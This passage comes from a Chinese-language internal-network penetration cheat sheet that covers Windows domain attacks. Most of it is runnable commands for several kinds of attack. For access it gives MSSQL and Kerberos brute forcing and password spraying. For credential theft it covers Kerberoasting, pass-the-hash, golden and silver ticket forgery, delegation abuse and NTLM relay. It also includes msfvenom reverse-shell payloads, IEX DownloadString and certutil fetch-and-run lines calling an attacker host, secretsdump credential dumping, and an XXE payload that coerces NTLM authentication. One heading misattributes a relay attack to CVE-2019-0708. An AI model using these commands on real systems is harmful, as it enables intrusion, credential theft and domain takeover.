&gt;Get-SQLInstanceDomain         #发现域中的SQLServer实例
&gt;Get-SQLInstanceBroadcast      #发现工作组SQLServer实例
&gt;$Targets = Get-SQLInstanceBroadcast -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username sa -password admin | Where-Object &#123;$_.Status -like &quot;Accessible&quot;&#125; 工作组mssql爆破
&gt;$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username sa -password admin | Where-Object &#123;$_.Status -like &quot;Accessible&quot;&#125; 
&gt;Get-SQLInstanceBroadcast -Verbose | Get-SQLServerLoginDefaultPw –Verbose
&gt;$Targets 域内MSSQL爆破
Nishang脚本爆破MSSQL
&gt;Invoke-BruteForce -ComputerName dc.zone.com -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service SQL -Verbose -StopOnSuccess
#use auxiliary/scanner/mssql/mssql_login 爆破主机
#use auxiliary/admin/mssql/mssql_exec 调用cmd
#use auxiliary/admin/mssql/mssql_sql 执行SQL语句
#use exploit/windows/mssql/mssql_payload 上线MSSQL主机
http://192.168.0.107/ps/nishang/Execution/Execute-Command-MSSQL.ps1
导入nishang执行MSSQL命令的脚本
&gt;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Execution/Execute-Command-MSSQL.ps1&#39;)
&gt;Execute-Command-MSSQL -ComputerName 192.168.0.98 -UserName sa -Password admin 会返回powershell
#use auxiliary/scanner/mssql/mssql_hashdump 导出MSSQL密码
已知服务器ntlmhash，未知mssql账号密码
Hash注入+socks无密码连接mssql
&gt;mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:. /ntlm:&#123;hash&#125; /run:\&quot;C:\*\SocksCap64\SocksCap64_RunAsAdmin.exe\&quot;&quot; &quot;exit&quot;
将SSMS.exe加入sockscap中启动
命令行版sqltool
https://github.com/uknowsec/SharpSQLTools
</code></pre>
<h3 id="隔离主机payload"><a href="#隔离主机payload" class="headerlink" title="隔离主机payload"></a>隔离主机payload</h3><pre><code>隔离主机一般与攻击机无双向路由，payload设置为bind让靶机监听。
&gt;set payload windows/meterpreter/bind_tcp
&gt;set RHOST 隔离机IP
</code></pre>
<p><img src="369.png" alt="image"></p>
<h3 id="爆破-2"><a href="#爆破-2" class="headerlink" title="爆破"></a>爆破</h3><h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><pre><code>参数：
-l 指定的用户名 -p 指定密码
-L 用户名字典  -P 密码字典
-s 指定端口 -o 输出文件
&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 mysql
&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 ssh -s 22 -t 4
&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 mssql -vv
&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 rdp -V
&gt;hydra -L /root/user.txt -P pass.txt smb 10.1.1.10 -vV
&gt;hydra -L /root/user.txt -P pass.txt ftp://10.1.1.10
</code></pre>
<h4 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h4><pre><code>参数：
-h 目标名或IP  -H 目标列表
-u 用户名 -U 用户名字典
-p 密码 -P 密码字典 -f 爆破成功停止 -M 指定服务 -t 线程
-n 指定端口 -e ns 尝试空密码和用户名密码相同
&gt;medusa -h ip -u sa -P /pass.txt -t 5 -f -M mssql
&gt;medusa -h ip -U /root/user.txt -P /pass.txt -t 5 -f -M mssql
</code></pre>
<h4 id="域内爆破"><a href="#域内爆破" class="headerlink" title="域内爆破"></a>域内爆破</h4><h5 id="Kerbrute"><a href="#Kerbrute" class="headerlink" title="Kerbrute"></a>Kerbrute</h5><pre><code>https://github.com/ropnop/kerbrute
用户枚举
&gt;kerbrute_windows_amd64.exe userenum -d zone.com username.txt
</code></pre>
<p><img src="371.png" alt="image"><br>    密码喷射<br>    &gt;kerbrute_windows_amd64.exe passwordspray -d zone.com use.txt password<br><img src="372.png" alt="image"></p>
<pre><code>密码爆破
此项会产生日志
&gt;kerbrute_windows_amd64.exe bruteuser -d zone.com pass.txt name
</code></pre>
<p><img src="373.png" alt="image"></p>
<pre><code>组合爆破
格式为username:password
&gt;kerbrute_windows_amd64.exe -d zone.com bruteforce com.txt
</code></pre>
<h5 id="DomainPasswordSpray"><a href="#DomainPasswordSpray" class="headerlink" title="DomainPasswordSpray"></a>DomainPasswordSpray</h5><pre><code>https://github.com/dafthack/DomainPasswordSpray
自动收集账户进行密码喷射
&gt;Invoke-DomainPasswordSpray -Password pass
</code></pre>
<p><img src="374.png" alt="image"></p>
<pre><code>组合爆破
&gt;Invoke-DomainPasswordSpray -UserList users.txt -Domain zone.com -PasswordList passlist.txt -OutFile result.txt
会产生日志
单密码
&gt;Invoke-DomainPasswordSpray -UserList users.txt -Domain zone.com -Password password
</code></pre>
<h3 id="方程式内网不产生session"><a href="#方程式内网不产生session" class="headerlink" title="方程式内网不产生session"></a>方程式内网不产生session</h3><pre><code>msfvenom生成一个x64或x86的dll文件，替换该工具下的x64.dll或x86.dll
windows server 2008 ，msfvenom生成x64.dll文件
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12345 -f dll &gt; x64.dll
msf配置
use exploit/multi/handler 
set payload windows/x64/meterpreter/reverse_tcp
set lport 12345
set lhost 192.168.0.107
将该x64.dll替换到方程式利用工具下面。
只需要更换目标的IP，就可以获取session。
windows server 2003 ，msfvenom生成x86.dll文件
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12345 -f dll &gt; x86.dll
msf配置
use exploit/multi/handler 
set payload windows/meterpreter/reverse_tcp
set lport 12345
set lhost 192.168.0.107
通过ms17_010_commend模块执行系统命令添加用户至管理员。再指定SMBPass和SMBUser来建立windows可访问命名管道
</code></pre>
<h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><pre><code> https://github.com/nidem/kerberoast 
</code></pre>
<h4 id="SPN发现"><a href="#SPN发现" class="headerlink" title="SPN发现"></a>SPN发现</h4><h5 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h5><pre><code>&gt;setspn -T 域名 -Q */*
</code></pre>
<p><img src="375.png" alt="image"></p>
<h5 id="Powershell-4"><a href="#Powershell-4" class="headerlink" title="Powershell"></a>Powershell</h5><p><a class="link" href="https://github.com/PyroTek3/PowerShell-AD-Recon">https://github.com/PyroTek3/PowerShell-AD-Recon<i class="fas fa-external-link-alt"></i></a><br><img src="376.png" alt="image"></p>
<pre><code>Powerview
&gt;Get-NetComputer -SPN termsrv*
&gt;Get-NetUser -SPN
</code></pre>
<p><img src="377.png" alt="image"></p>
<pre><code>&gt;import module GetUserSPNs.ps1
</code></pre>
<h5 id="Empire-2"><a href="#Empire-2" class="headerlink" title="Empire"></a>Empire</h5><pre><code>&gt;usemodule situational_awareness/network/get_spn
</code></pre>
<h4 id="申请票据"><a href="#申请票据" class="headerlink" title="申请票据"></a>申请票据</h4><pre><code>&gt;Add-Type -AssemblyName System.IdentityModel
&gt;New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;SPN&quot;
&amp;
&gt;kerberos::ask /target:SPN
</code></pre>
<h4 id="导出票据"><a href="#导出票据" class="headerlink" title="导出票据"></a>导出票据</h4><pre><code>mimikatz&gt;kerberos::list /export
</code></pre>
<h4 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h4><pre><code>&gt;python tgsrepcrack.py word.txt file.kirbi
https://github.com/leechristensen/tgscrack
&gt;python extractServiceTicketParts.py file.kirbi
&gt;tgscrack.exe -hashfile hash.txt -wordlist word.txt
</code></pre>
<h4 id="重写票据"><a href="#重写票据" class="headerlink" title="重写票据"></a>重写票据</h4><pre><code>&gt;python kerberoast.py -p Password123 -r file.kirbi -w new.kirbi -u 500
&gt;python kerberoast.py -p Password123 -r file.kirbi -w new.kirbi -g 512
注入内存、
&gt;kerberos::ptt new.kirbi
</code></pre>
<h4 id="GetUserSPNs"><a href="#GetUserSPNs" class="headerlink" title="GetUserSPNs"></a>GetUserSPNs</h4><pre><code>https://github.com/SecureAuthCorp/impacket
请求TGS
&gt;python GetUserSPNs.py -request -dc-ip 10.1.1.1 zone.com/y
破解
&gt;hashcat -m 13100 -a 0 kerberos.txt wordlist.txt
</code></pre>
<h3 id="ASEPRoasting"><a href="#ASEPRoasting" class="headerlink" title="ASEPRoasting"></a>ASEPRoasting</h3><pre><code>当用户关闭了kerberos预身份认证时可以进行攻击
</code></pre>
<p><img src="378.png" alt="image"></p>
<pre><code>&gt;Rubeus.exe asreproast /user:y /dc:10.1.1.100 /domain:zone.com
</code></pre>
<p><img src="379.png" alt="image"></p>
<pre><code>或使用Powerview结合https://github.com/gold1029/ASREPRoast
获取不要求kerberos预身份验证的域内用户
&gt;Get-DomainUser -PreauthNotRequired -Properties distinguishedname –Verbose
</code></pre>
<p><img src="380.png" alt="image"></p>
<pre><code>&gt;Get-ASREPHash -UserName y -Domain zone.com -Verbose
</code></pre>
<p><img src="381.png" alt="image"></p>
<pre><code>破解RC4-HMAC AS-REP
&gt;john hash.txt --wordlist=wordlist.txt
</code></pre>
<p><img src="382.png" alt="image"></p>
<h3 id="PASS-THE-HASH"><a href="#PASS-THE-HASH" class="headerlink" title="PASS-THE-HASH"></a>PASS-THE-HASH</h3><pre><code>允许本地管理组所有成员连接
&gt;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f  
</code></pre>
<h4 id="WMIExec-amp-TheHash"><a href="#WMIExec-amp-TheHash" class="headerlink" title="WMIExec &amp; TheHash"></a>WMIExec &amp; TheHash</h4><pre><code>&gt;powershell -ep bypass
&gt;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-TheHash/Invoke-WMIExec.ps1&#39;); 
&gt;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-TheHash/Invoke-TheHash.ps1&#39;);
&gt;Invoke-TheHash -Type WMIExec -Target 192.168.0.0/24 -Domain zone.com -Username godadmin -Hash f1axxxxxxxxxb771
</code></pre>
<p><img src="383.png" alt="image"></p>
<h4 id="WMI-1"><a href="#WMI-1" class="headerlink" title="WMI"></a>WMI</h4><pre><code>&gt;net use \\1.1.1.1\admin$ /user:&quot;administrator&quot; &quot;password&quot;
&gt;copy windowsupdate.exe \\1.1.1.1\admin$\dir\
&gt;wmic /NODE:&quot;1.1.1.1&quot; /user:&quot;administrator&quot; /password:&quot;password&quot; PROCESS call create &quot;c:\windows\dir\windowsupdate.exe&quot; 
&gt;del \\1.1.1.1\admin$\dir\windowsupdate.exe /F 
&gt;net use \\1.1.1.1\admin$ /del
</code></pre>
<h5 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h5><pre><code>https://github.com/SecureAuthCorp/impacket 
&gt;python wmiexec.py -hashes AAD3B435B51404EEAAD3B435B51404EE:A812E6C2DEFCB0A7B80868F9F3C88D09 域名/Administrator@192.168.11.1 &quot;whoami&quot;
&gt;python wmiexec.py admin@192.168.1.2
</code></pre>
<p><img src="384.png" alt="image"></p>
<h5 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h5><pre><code>半交互式：
&gt;cscript //nologo wmiexec.vbs /shell 192.168.1.2 admin pass
单条命令
&gt;cscript //nologo wmiexec.vbs /cmd 192.168.1.2 domain\admin pass &quot;whoami&quot;
下载执行
&gt;wmic /node:192.168.0.115 /user:godadmin /password:password PROCESS call create &quot;cmd /c certutil.exe -urlcache -split -f http://192.168.0.107/clickme.exe c:/windows/temp/win.exe &amp; c:/windows/temp/win.exe &amp; certutil.exe -urlcache -split -f http://192.168.0.107/clickme.exe delete&quot;
</code></pre>
<p><img src="385.png" alt="image"></p>
<h5 id="Powershell-5"><a href="#Powershell-5" class="headerlink" title="Powershell"></a>Powershell</h5><pre><code>&gt;wmic /NODE:192.168.3.108 /user:&quot;godadmin&quot; /password:&quot;password&quot; PROCESS call create &quot;powershell -nop -exec bypass -c \&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/xxx.txt&#39;);\&quot;&quot;
Invoke-WMIExec
&gt;powershell -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-WMIExec.ps1&#39;);Invoke-WMIExec -Target 192.168.0.115 -Domain Workgroup -Username godadmin -Hash f1a5b1a3641bec99ff92fe9df700b771 -Command \&quot;net user admin Qwe@123 /add\&quot; -Verbose&quot;
</code></pre>
<p><img src="386.png" alt="image"></p>
<pre><code>&gt;powershell -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-WMIExec.ps1&#39;);Invoke-WMIExec -Target 192.168.0.115 -Domain Workgroup -Username godadmin -Hash f1xxxxxxxxxxxxx771 -Command \&quot;mshta http://192.168.0.107:8080/YAyAPN6odzbAzKn.hta\&quot; -Verbose&quot;
</code></pre>
<p><img src="387.png" alt="image"></p>
<h4 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h4><pre><code>&gt;psexec.exe -hashes AAD3B435B51404EEAAD3B435B51404EE:A812E6C2DEFCB0A7B80868F9F3C88D09域名/Administrator@192.168.1.1 &quot;whoami&quot;
&gt;psexec.exe –accepteula \\192.168.1.2 –u admin –p pass cmd.exe 无确认窗
Msf
#use exploit/windows/smb/psexec
#use exploit/windows/smb/psexec_psh(powershell版本)
</code></pre>
<h4 id="Mimikatz-2"><a href="#Mimikatz-2" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><pre><code>Windows XP、Vista、2008、7、2008 r2 和2012没有安装KB2871997补丁的机器上，使用NTLM进行PTH
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:admin /domain:xxx.com /ntlm:&#123;ntlm&#125;
执行一个文件
mimikatz # sekurlsa::pth /user:admin /domain:xxx.com /ntlm:&#123;ntlm&#125; /run:powershell.exe
Windows 8.1 、2012 R2、安装KB2871997的Win 7 、2008 R2和2012上可使用AES KEY进行PTH
&gt;privilege::debug
&gt;sekurlsa::ekeys
&gt;sekurlsa::pth /user:administrator /domain:zone.com /aes128:&#123;key&#125;
</code></pre>
<h4 id="pth-winexe"><a href="#pth-winexe" class="headerlink" title="pth-winexe"></a>pth-winexe</h4><pre><code>&gt;pth-winexe -U godadmin%password --system --ostype=1 //192.168.0.115 cmd
</code></pre>
<p><img src="388.png" alt="image"></p>
<h4 id="Smbexec"><a href="#Smbexec" class="headerlink" title="Smbexec"></a>Smbexec</h4><pre><code>&gt;python smbexec.py administrator@192.168.0.98
</code></pre>
<p><img src="389.png" alt="image"></p>
<h3 id="PASS-THE-TICKET"><a href="#PASS-THE-TICKET" class="headerlink" title="PASS-THE-TICKET"></a>PASS-THE-TICKET</h3><h4 id="名词"><a href="#名词" class="headerlink" title="名词"></a>名词</h4><pre><code>KDC(Key Distribution Center)： 密钥分发中心，里面包含两个服务：AS和TGS
AS(Authentication Server)： 身份认证服务
TGS(Ticket Granting Server)： 票据授予服务
TGT(Ticket Granting Ticket): 由身份认证服务授予的票据，用于身份认证，存储在内存，默认有效期为10小时
</code></pre>
<h4 id="黄金票据-Mimikatz"><a href="#黄金票据-Mimikatz" class="headerlink" title="黄金票据+Mimikatz"></a>黄金票据+Mimikatz</h4><pre><code>Golden Ticket伪造TGT(Ticket Granting Ticket)，可以获取任何Kerberos服务权限，
域控中提取krbtgt的hash
域控：dc.zone.com
域内机器：sub2k8.zone.com
域内普通用户：y
域内机器是不能访问dc上的文件
</code></pre>
<p><img src="390.png" alt="image"></p>
<pre><code>清空票据
</code></pre>
<p><img src="391.png" alt="image"></p>
<pre><code>域控中获取krbtgt用户的信息
&gt;privilege::debug
&gt;mimikatz log &quot;lsadump::dcsync /domain:zone.com /user:krbtgt&quot;
获取信息：/domain、/sid、/aes256
</code></pre>
<p><img src="392.png" alt="image"></p>
<pre><code>在sub2k8中生成golden ticket
&gt;mimikatz “kerberos::golden /krbtgt:&#123;ntlmhash&#125; /admin:域管理 /domain:域名 /sid:sid /ticket:gold.kirbi”
</code></pre>
<p><img src="393.png" alt="image"></p>
<pre><code>导入
Mimikatz#kerberos::ptt 123.kirbi
</code></pre>
<p><img src="394.png" alt="image"></p>
<h4 id="白银票据-Mimikatz"><a href="#白银票据-Mimikatz" class="headerlink" title="白银票据+Mimikatz"></a>白银票据+Mimikatz</h4><p><img src="395.png" alt="image"></p>
<pre><code>Silver Ticket是伪造的TGS，只能访问指定服务权限
域控：dc.zone.com
域内机器：sub2k8.zone.com
域内普通用户：y
域控中导出
&gt;privilege::debug
&gt;sekurlsa::logonpasswords
</code></pre>
<p><img src="396.png" alt="image"></p>
<pre><code>Sub2k8伪造票据
&gt;mimikatz &quot;kerberos::golden /domain:zone.com /sid:&#123;SID&#125; /target:dc.zone.com /service:cifs /rc4:&#123;NTLM&#125; /user:y /ptt&quot;
</code></pre>
<p><img src="397.png" alt="image"></p>
<h4 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h4><pre><code>https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068
https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe
域控：dc.zone.com/10.1.1.100
域内机器：sub2k8.zone.com/10.1.1.98
域内普通用户：y，
Sub2k8中清除票据
Mimikatz#kerberos::purge
&gt;whoami /user查看SID 
创建ccache票据文件
&gt; MS14-068.exe -u y@zone.com -p password -s S-1-5-21-2346829310-1781191092-2540298887-1112 -d dc.zone.com
注入票据
Mimikatz# Kerberos::ptc c:\xx\xx\xxx.ccache
psexec无密码登陆
&gt;PsExec.exe \\dc.xx.com\ cmd.exe
</code></pre>
<h4 id="Mimikatz-MSF"><a href="#Mimikatz-MSF" class="headerlink" title="Mimikatz+MSF"></a>Mimikatz+MSF</h4><pre><code>&gt;whoami /user 查看SID
msf &gt;use auxiliary/admin/kerberos/ms14_068_kerberos_checksum
msf &gt;set domain 域名
msf &gt;set password 密码
msf &gt;set rhost 域控机器
msf &gt;set user 用户
msf &gt;set user_sid sid
得到.bin文件
#apt-get install krb5-user
上传mimikatz和bin文件
Mimikatz# Kerberos::clist “xxxx.bin” /export
生成kirbi文件
Meterpreter &gt;load kiwi
Meterpreter &gt;download c:/wmpub/xxxxxx.kirbi /tmp/
注入票据
Meterpreter &gt;kerberos_ticket_use /tmp/xxxxxx.kirbi
#use exploit/windows/local/current_user_psexec
#set TECHNIQUE PSH
#set RHOST dc.xx.com
#set payload windows/meterpreter/reverse_tcp
#set LHOST 192.168.1.1
#set session 1
#exploit
</code></pre>
<h4 id="goldenPac-py"><a href="#goldenPac-py" class="headerlink" title="goldenPac.py"></a>goldenPac.py</h4><pre><code>kali下
#apt-get install krb5-user
#goldenPac.py –dc-ip 10.1.1.100 –target-ip 10.1.1.100 zone.com/y:password@dc.zone.com
</code></pre>
<h3 id="账户委派"><a href="#账户委派" class="headerlink" title="账户委派"></a>账户委派</h3><h4 id="账户非受限委派"><a href="#账户非受限委派" class="headerlink" title="账户非受限委派"></a>账户非受限委派</h4><pre><code>设置用户y为服务账户(服务账户有委派权限)
&gt;setspn -U -A variant/golden y
</code></pre>
<p><img src="398.png" alt="image"></p>
<pre><code>查询非受限委派域内账号，使用powerview
&gt;Get-NetUser -Unconstrained -Domain zone.com
</code></pre>
<p><img src="399.png" alt="image"></p>
<pre><code>利用
管理员权限打开mimikatz导出TGT
&gt;privilege::debug
&gt;sekurlsa::tickets /export
</code></pre>
<p><img src="400.png" alt="image"></p>
<pre><code>清空票据，导入票据
</code></pre>
<p><img src="401.png" alt="image"><br><img src="402.png" alt="image"></p>
<pre><code>获得Powershell会话
&gt; Enter-PSSession -ComputerName dc.zone.com
</code></pre>
<p><img src="403.png" alt="image"></p>
<h4 id="账户受限委派"><a href="#账户受限委派" class="headerlink" title="账户受限委派"></a>账户受限委派</h4><pre><code>查询受限委派用户
&gt; Get-DomainUser -TrustedToAuth –Domain zone.com
</code></pre>
<p><img src="404.png" alt="image"></p>
<pre><code>查询受限委派主机
&gt; Get-DomainComputer -TrustedToAuth -Domain zone.com
</code></pre>
<p><img src="405.png" alt="image"></p>
<pre><code>利用方法后见权限维持模块
</code></pre>
<h3 id="资源受限委派"><a href="#资源受限委派" class="headerlink" title="资源受限委派"></a>资源受限委派</h3><pre><code>获取域管理员
&gt;Get-DomainUser|select -First 1
域对象信息
&gt;Get-DomainObject -Identity &#39;DC=zone,DC=com&#39;
ms-ds-machineaccountquota允许非特权用户将最多 10 台计算机连接到域
</code></pre>
<p><img src="406.png" alt="image"></p>
<pre><code>查看有没有设置msDS-AllowedToActOnBehalfOfOtherIdentity策略
&gt;Get-DomainComputer dc|select name, msDS-AllowedToActOnBehalfOfOtherIdentity
</code></pre>
<p><img src="407.png" alt="image"></p>
<pre><code>用powermad添加一具备SPN的机器账户
https://github.com/Kevin-Robertson/Powermad
&gt;New-MachineAccount -MachineAccount newcom
</code></pre>
<p><img src="408.png" alt="image"></p>
<pre><code>或
&gt;$pass = ConvertTo-SecureString &#39;123qwe!@#&#39; -AsPlainText –Force
&gt;New-MachineAccount –MachineAccount newcom -Password $pass
或
&gt;New-MachineAccount -MachineAccount newcom -Password $(ConvertTo-SecureString &#39;123qwe!@#&#39; -AsPlainText -Force)
</code></pre>
<p><img src="409.png" alt="image"></p>
<pre><code>获取添加的机器账户的SID
</code></pre>
<p><img src="410.png" alt="image"></p>
<pre><code>将添加的机器账户的SID设置给DC的msDS-AllowedToActOnBehalfOfOtherIdentity参数
&gt;$SD=New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2346829310-1781191092-2540298887-1122)&quot;; $SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer dc | Set-DomainObject -Set @&#123;&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes&#125;
设置完成后查看
</code></pre>
<p><img src="411.png" alt="image"></p>
<pre><code>配置ACL允许访问
&gt;$RawBytes=Get-DomainComputer dc -Properties &#39;msds-allowedtoactonbehalfofotheridentity&#39; |select -expand msds-allowedtoactonbehalfofotheridentity;$Descriptor= New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes,0;$Descriptor.DiscretionaryAcl
</code></pre>
<p><img src="412.png" alt="image"></p>
<pre><code>此时使用创建的机器账户的hash可伪造域管
先获取newcom的NTLM
&gt;Rubeus.exe hash /password:123qwe!@# /user:newcom /domain:zone.com
</code></pre>
<p><img src="413.png" alt="image"></p>
<pre><code>导入票据伪造域管用户访问cifs服务
&gt;Rubeus.exe s4u /user:newcom$ /rc4:00AFFD88FA323B00D4560B F9FEF0EC2F /impersonateuser:godadmin /msdsspn:cifs/dc.zone.com /ptt
</code></pre>
<p><img src="414.png" alt="image"></p>
<pre><code>成功获取到godadmin的tgs
</code></pre>
<p><img src="415.png" alt="image"><br><img src="416.png" alt="image"><br><img src="417.png" alt="image"></p>
<h3 id="CVE-2019-0708"><a href="#CVE-2019-0708" class="headerlink" title="CVE-2019-0708"></a>CVE-2019-0708</h3><pre><code>&gt;python ntlmrelayx.py -t ldaps://dc.zone.com --remove-mic --delegate-access -smb2support
&gt;python printerbug.py zone.com/y@win7.zone.com 192.168.0.attack
&gt;python getST.py -spn host/win7.zone.com &#39;zone.com/机器账户$:密码&#39; -impersionate administrator -dc-ip 192.168.0.1
&gt;export KRB5CCNAME=XX.ccahe
&gt;python secretdump.py -k -no-pass dc.zone.com -just-dc
</code></pre>
<h3 id="NTLM中继"><a href="#NTLM中继" class="headerlink" title="NTLM中继"></a>NTLM中继</h3><h4 id="Ntlmrelayx-资源受限委派"><a href="#Ntlmrelayx-资源受限委派" class="headerlink" title="Ntlmrelayx+资源受限委派"></a>Ntlmrelayx+资源受限委派</h4><pre><code>域控需启用ldaps，域机器启用ipv6
*当执行ntlmrelayx脚本时，遇到报错
</code></pre>
<p><img src="418.png" alt="image"></p>
<pre><code>修改
impacket/impacket/examples/ntlmrelayx/attacks/ldapattack.py ldapattack.py脚本，在510行上方加入
if self.config.interactive: 
</code></pre>
<p><img src="419.png" alt="image"></p>
<pre><code>再重新安装&gt;python setup.py install
使用mitm6通过ipv6接管dns服务器，配置好后开始请求网络的WPAD
&gt;mitm6 -i eth1 -d zone.com
</code></pre>
<p><img src="420.png" alt="image"></p>
<pre><code>使用ntlmreplyx.py监听
&gt;python ntlmrelayx.py -t ldaps://dc.zone.com -debug -ip 10.1.1.101 --delegate-access --add-computer
当目标重启网络、访问浏览器、重启电脑时会把攻击机视为代理服务器，当目标通过攻击机代理服务器访问网络时，攻击机将会向目标发送代理的认证请求，并中继NTLM认证到LDAP服务器上，完成攻击。
这里要使用ldaps，因为域控会拒绝在不安全的连接中创建账户。
</code></pre>
<p><img src="421.png" alt="image"></p>
<pre><code>可以看到已经成功添加了一个机器账户RFAYOVCC密码6YdX.NXqQGyuR7[
使用此机器账户申请票据
&gt;python getST.py -spn cifs/sub2k8.zone.com zone.com/RFAYOVCC\$ -impersonate y
</code></pre>
<p><img src="422.png" alt="image"></p>
<pre><code>&gt;export KRB5CCNAME=y.ccache
获取shell
&gt;python smbexec.py -no-pass -k sub2k8.zone.com
</code></pre>
<p><img src="423.png" alt="image"></p>
<pre><code>dumphash、缓存hash
&gt;python secretsdump.py -k -no-pass sub2k8.zone.com
</code></pre>
<p><img src="424.png" alt="image"></p>
<pre><code>当域控机器未启用LDAPS，并且已获得域普通用户权限时
使用powermad创建一个机器账户newcom
https://github.com/Kevin-Robertson/Powermad
&gt;New-MachineAccount -MachineAccount newcom -Password $(ConvertTo-SecureString &#39;123qwe!@#&#39; -AsPlainText -Force)
</code></pre>
<p><img src="425.png" alt="image"></p>
<pre><code>或
</code></pre>
<p><img src="426.png" alt="image"><br><img src="427.png" alt="image"></p>
<pre><code>&gt;python ntlmrelayx.py -t ldaps://dc.zone.com -debug -ip 10.1.1.101 --delegate-access --escalate-user newcom\$
</code></pre>
<p><img src="428.png" alt="image"></p>
<pre><code>后续正常操作即可。
内网存在java webdav时PROPPATCH、PROPFIND、 LOCK等请求方法接受XML作为输入时会形成xxe。攻击者要求采用NTLM认证方式是，webdav会自动使用当前用户的凭据认证。
使用ntlmrelayx监听
&gt;python ntlmrelayx.py -t ldaps://dc.zone.com -debug -ip 10.1.1.101 --delegate-access --escalate-user newcom\$
Burp发送xxe请求
PROPFIND /webdav HTTP/1.1
Host: 1.1.1.1

&lt;?xml version&quot;1.0&quot; encoding=&quot;UFT-8&quot;?&gt;
&lt;!DOCTYPE xxe [
&lt;!ENTITY loot SYSTEM &quot;http://10.1.1.101&quot;&gt; ]&gt;
&lt;D:xxe xmln:D=&quot;DAV:&quot;&gt;&lt;D:set&gt;&lt;D:prop&gt;
&lt;a xmlns=&quot;http://xx.e&quot;&gt;&amp;loot;&lt;/a&gt;
&lt;/D:prop&gt;&lt;/D:set&gt;&lt;/D:xxe&gt;
</code></pre>
<h4 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h4><h5 id="SMB协议截获"><a href="#SMB协议截获" class="headerlink" title="SMB协议截获"></a>SMB协议截获</h5><pre><code>内网中间人攻击脚本，kali内置
监听网络接口
&gt;responder -I wlan0(eth0)
指定某台机器或网段：修改/etc/responder/Responder.py中RespondTo参数。
网段中有认证行为会捕获NTLMv2 hash
</code></pre>
<p><img src="429.png" alt="image"></p>
<pre><code>当访问一个不存在的共享时修改配置文件来解析
Xp
修改/usr/share/responder/servers/SMB.py定位到errorcode修改为\x71\x00\x00\xc0，删除掉/usr/share/responder/Responder.db
</code></pre>
<p><img src="430.png" alt="image"></p>
<pre><code>XP时使用\\cmd\share形式访问共享输入密码达4次会断开连接。
定位到
</code></pre>
<p><img src="431.png" alt="image"></p>
<pre><code>修改self.ntry != 10
Win7以上
修改/usr/share/responder/servers/SMB.py定位到##Session Setup 3
</code></pre>
<p><img src="432.png" alt="image"></p>
<pre><code>删除掉and GrabMessageID(data)[0:1] == &quot;\x02&quot;，删除掉/usr/share/responder/Responder.db
修改后可以进行解析，捕获hash，否则会报错误64
</code></pre>
<p><img src="433.png" alt="image"></p>
<pre><code>强制截取NTLMv1 hash，修改/usr/share/responder/packets.py，定位到以下参数，修改为\x15\x82\x81\xe2，修改Conf文件设置Challenge为16位固定值。
</code></pre>
<p><img src="434.png" alt="image"><br><img src="435.png" alt="image"><br><img src="436.png" alt="image"></p>
<h5 id="WPAD代理欺骗"><a href="#WPAD代理欺骗" class="headerlink" title="WPAD代理欺骗"></a>WPAD代理欺骗</h5><pre><code>&gt;responder -I eth0 -v -F 
F参数即可开启强制WPAD认证服务抓取 hash，访问IE或重启电脑即可发送欺骗认证获得hash。
</code></pre>
<p><img src="437.png" alt="image"><br><img src="438.png" alt="image"></p>
<pre><code>重启也可以抓到
</code></pre>
<p><img src="439.png" alt="image"></p>
<h5 id="Web漏洞"><a href="#Web漏洞" class="headerlink" title="Web漏洞"></a>Web漏洞</h5><pre><code>内网中使用文件包含漏洞和XSS
&gt;Responder -I eth0 -v
http://10.1.1.1/file.php?file=\\10.1.1.12\share
http://10.1.1.1/xss.php?article=&lt;img src=\\10.1.1.12\xx&gt;
</code></pre>
